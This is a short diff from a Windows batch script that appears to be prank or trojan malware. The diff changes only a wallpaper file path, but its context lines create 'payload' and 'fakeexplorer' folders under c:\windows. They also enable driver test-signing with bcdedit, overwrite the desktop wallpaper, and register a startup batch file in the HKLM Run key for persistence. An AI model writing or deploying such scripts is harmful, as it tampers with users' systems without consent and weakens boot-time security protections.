@@ -204,7 +204,7 @@ mkdir c:\windows\payload
 mkdir c:\windows\wallpapertroll
 xcopy %CD%\junkins\startup\no.bat c:\windows\fakeexplorer /y /q /h
 xcopy %CD%\junkins\startup\startup.bat c:\windows\payload\startup.bat /y /q /h
-xcopy %CD%\walp.bmp c:\windows\wallpapertroll\walp.bmp /y /q /h
+xcopy %CD%\junkins\walp\walp.bmp c:\windows\wallpapertroll\walp.bmp /y /q /h
 bcdedit /set TESTSIGNING on
 reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d c:\windows\wallpapertroll\walp.bmp /f
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v cmdv4 /t REG_SZ /d c:\windows\payload\startup.bat
